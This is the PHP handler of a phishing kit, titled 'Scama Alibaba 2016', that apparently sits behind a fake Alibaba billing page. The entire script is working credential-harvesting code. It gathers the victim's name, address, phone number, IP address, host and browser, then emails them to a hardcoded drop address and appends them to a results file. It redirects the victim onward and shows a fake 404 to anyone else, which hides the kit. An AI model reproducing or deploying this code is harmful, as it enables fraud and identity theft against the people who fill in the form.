<?php
/////
//
//     Scama Alibaba 2016
//  
//   Coded By Achroufa TN
//
//   Facebook : https://www.facebook.com/achraf.mkaoua
//
//    
//
/////
if (isset($_POST['name']) && $_POST['name'] != "") {
	$ip = getenv("REMOTE_ADDR");
	$message .= "-------------- Billing ^_^ $$   -------------\n";
	$message .= "Full Name  : ".$_POST['name']."\n";
	$message .= "Address Line 1  : ".$_POST['adrs1']."\n";
	$message .= "Address Line 2  : ".$_POST['adrs2']."\n";
	$message .= "Country  : ".$_POST['country']."\n";
	$message .= "City  : ".$_POST['city']."\n";
	$message .= "Region : ".$_POST['region']."\n";
	$message .= "Zip Code : ".$_POST['zip']."\n";
	$message .= "Phone Number : ".$_POST['phone']."\n";
	$message .= "-------------- IP Tracing ------------\n";
	$message .= "IP      : $ip\n";
	$message .= "Host    : ".gethostbyaddr($ip)."\n";
	$message .= "Browser : ".$_SERVER['HTTP_USER_AGENT']."\n";
	$message .= "---------- By achroufa ---------\n";
	$subject = "Login>billing | $ip | ".$_POST['email'];
	$send = "om12sg@hotmail.com"; //Put You Email Here
	$headers = 'From: Alib4b4Sc4m' . "\r\n";
	mail($send,$subject,$message,$headers);
	$file = fopen("rzlt.txt", 'a');
    fwrite($file, $message);
	echo '<META HTTP-EQUIV="Refresh" Content="0; URL=../payment.php?df4cc48c24121eeede">';
}else{
	header("HTTP/1.0 404 Not Found");
    die("<h1>404 Not Found</h1>The page that you have requested could not be found.");
}
  
?>